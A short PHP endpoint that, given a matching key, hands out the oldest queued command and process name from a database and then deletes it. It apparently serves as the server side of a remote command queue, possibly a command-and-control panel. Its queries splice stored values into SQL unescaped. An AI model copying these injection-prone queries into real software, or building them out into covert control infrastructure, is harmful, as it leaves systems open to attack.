<?php
	require("config.php");
	if($_POST['key'] == $key)
	{
		$query = mysqli_query($conn, "SELECT * FROM commands ORDER BY date ASC LIMIT 1");
		$command = mysqli_fetch_array($query);
		$query = mysqli_query($conn, "SELECT * FROM processes WHERE name = '".$command['process']."'");
		$process = mysqli_fetch_array($query);
		echo $command['command'].'|'.$command['process'];
		mysqli_query($conn, "DELETE FROM commands WHERE command = '".$command['command']."'");
	}
	else
		echo "Unauthorized!";
?>